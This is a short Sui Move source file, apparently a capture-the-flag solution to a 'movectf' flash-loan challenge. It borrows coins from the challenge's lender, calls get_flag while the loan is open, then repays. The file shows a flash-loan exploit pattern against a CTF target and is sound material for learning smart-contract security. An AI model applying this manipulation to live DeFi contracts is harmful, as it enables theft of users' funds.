module flash_loan_solution::solution{

    use sui::tx_context::TxContext; // Use the transaction context from Sui module

    // Use Self and FlashLender directly from the movectf::flash module
    // we can still use the functions and other things from the module, we will 
    // just need to use the full path to access them
    use movectf::flash::{Self, FlashLender};

    public entry fun getFlag(flash_lender: &mut FlashLender, ctx: &mut TxContext) {
        // Borrow the coins from the FlashLender
        let (borrowed_coins, receipt) = flash::loan(flash_lender, 1000, ctx);

        // Get flag
        flash::get_flag(flash_lender, ctx);

        // Pay back loans
        flash::repay(flash_lender, borrowed_coins);
        flash::check(flash_lender, receipt);
    }

}